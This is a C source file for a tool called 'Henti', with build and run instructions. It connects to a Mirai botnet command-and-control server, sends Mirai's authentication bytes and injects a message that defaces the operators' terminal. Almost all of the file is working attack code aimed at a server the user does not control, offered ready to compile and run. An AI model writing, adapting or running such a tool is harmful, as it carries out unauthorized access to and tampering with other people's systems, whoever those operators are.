/*
  ___ ___                 __  .__ _______          __     ___ ___                 __         .__
 /   |   \   ____   _____/  |_|__|\      \   _____/  |_  /   |   \   ____   _____/  |______  |__|
/    ~    \_/ __ \ /    \   __\  |/   |   \ /  _ \   __\/    ~    \_/ __ \ /    \   __\__  \ |  |
\    Y    /\  ___/|   |  \  | |  /    |    (  <_> )  |  \    Y    /\  ___/|   |  \  |  / __ \|  |
 \___|_  /  \___  >___|  /__| |__\____|__  /\____/|__|   \___|_  /  \___  >___|  /__| (____  /__|
       \/       \/     \/                \/                    \/       \/     \/          \/

       Created 5/29/2023

        - Install gcc (Example Debian Based "apt install gcc")

        - How To Run? (gcc main.c -o Henti -Wextra)
            (./Henti C2IP C2Port)
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <unistd.h>

void deface(char *Host, int Port)
{
    int sockfd;
    struct sockaddr_in servaddr;

    char AuthBytes[] = {0x00, 0x00, 0x00, 0x01};                                                    // Auth Bytes Mirai Uses
    char Message[] = "\x1b[2J\x1b[HHenti Defaced Yo Net\r\nPlease Learn How To Code Skiddo\r\n"; // Edit Message Here!!!

    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sockfd == -1)
    {
        perror("[:Henti] Failed To Create Socket!");
        return;
    }

    memset(&servaddr, '\0', sizeof(servaddr));

    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr(Host);
    servaddr.sin_port = htons(Port);

    if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) != 0)
    {

        printf("[:Henti] Connection To %s:%d Failed!\n", Host, Port);
        exit(0);
    }

    // Connected To The Cnc Is Now Done Now Using sockfd To Sent Information To The Socket

    unsigned char MessageByte = sizeof(Message); // Byte Length For Size of The message

    send(sockfd, AuthBytes, 4, MSG_NOSIGNAL);

    send(sockfd, &MessageByte, 1, MSG_NOSIGNAL);

    send(sockfd, Message, strlen(Message) + 1, MSG_NOSIGNAL);

    printf("[:Henti] Sent Deface To [%s:%d] Message Buffer Size (%ld)\n", Host, Port, sizeof(Message));


    sleep(350);

    close(sockfd);
}

int main(int argc, char *argv[])
{

    int Port;

    printf("  ___ ___                 __  .__ \r\n");
    printf(" /   |   \\   ____   _____/  |_|__|\r\n");
    printf("/    ~    \\_/ __ \\ /    \\   __\\  |\r\n");
    printf("\\    Y    /\\  ___/|   |  \\  | |  |\r\n");
    printf(" \\___|_  /  \\___  >___|  /__| |__|\r\n");
    printf("       \\/       \\/     \\/         \r\n");

    if (argc != 3)
    {

        puts("[:Henti] Please Use The Correct Args ./Henti IPV4 Port\n[:Henti] Make Sure Its A Mirai IP And Port!\n");
        exit(0);
    }

    if (strlen(argv[1]) > 15)
    {
        puts("[:Henti] Please Check Your Host Ip\n");
        exit(0);
    }

    if ((Port = atoi(argv[2])) != 0)
    {

        deface(argv[1], Port);
        exit(0);
    }

    puts("[:Henti] Please Make Sure Your Port Is A Number!\n");
    exit(0);

    return 0;
}
